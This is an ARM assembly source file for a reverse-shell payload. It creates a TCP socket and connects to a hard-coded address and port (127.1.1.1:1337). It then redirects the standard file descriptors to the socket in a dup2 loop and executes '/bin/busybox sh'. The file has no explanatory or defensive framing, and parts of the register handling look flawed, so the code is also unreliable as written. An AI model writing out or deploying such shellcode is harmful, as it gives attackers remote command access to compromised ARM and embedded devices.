.data
busy:
    .ascii  "/bin/busybox\0"
sh:
    .ascii  "sh\0"

.text
.globl _start
_start:
    ldr r7, =0x119
    mov r0, $0x2 @ family
    mov r1, $0x1 @ type
    mov r2, $0x0 @ protocol
    svc $0 @ syscall socket

    mov r6, r0
   
    ldr r5, =0x0101017f
    push {r5}
    ldr r5, =0x39050002
    push {r5}

    mov r1, sp
    mov r2, $0x10
    ldr r7, =0x11b
    svc $0 @ syscall connect

    mov r0, r6

    @ SYS_DUP2
    mov     r1, $0x3
    loop:
        subs    r1, r1, $0x1
        mov     r7, $0x3f
        svc     $0
        bne     loop

    ldr     r0, =busy
    mov     r1, r0
    eor     r2, r2
    push    {r2}
    ldr     r1, =sh
    push    {r1}
    mov     r1, sp
    mov     r7, $11
    swi     $0

    mov     r0, $0
    mov     r7, $1
    swi     $0 @ SYS_EXECVE

    mov r7, $0x1
    mov r0, $0x0
    svc $0 @ syscall exit
